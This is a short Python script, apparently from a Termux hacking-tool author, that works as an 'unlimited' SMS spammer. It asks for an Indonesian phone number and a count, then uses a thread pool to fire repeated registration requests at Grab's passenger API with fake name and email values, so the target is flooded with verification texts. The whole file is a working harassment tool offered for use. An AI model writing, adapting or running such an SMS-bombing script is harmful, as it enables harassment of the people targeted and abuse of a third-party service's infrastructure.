#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by @thetermuxchoice
"""
Copyright ©2019 by thetermuxchoice. All rights reserved.
https://github.com/thetermuxchoice
"""
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nYou have not installed the request module!")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print("""\033[1;32m
   _  _
 _| || |_   \033[1;36m..::SPAM SMS GRAB UNLIMITED::..\033[1;32m
|_  ..  _|  \033[1;31mAuthor   : Henrycko\033[1;32m
|_      _|  \033[1;31mContact  : thetermuxchoice@gmail.com\033[1;32m
  |_||_|    \033[1;31mPendukung: Dzakira Alzena Daiva\033[1;32m

""")
	no = input("\033[1;37m[?] NOMOR 62XXXXXXXXXX =>\033[1;36m ")
	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] BERHASIL")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("Selesai!...")
Henrycko.Developer@gmail.com
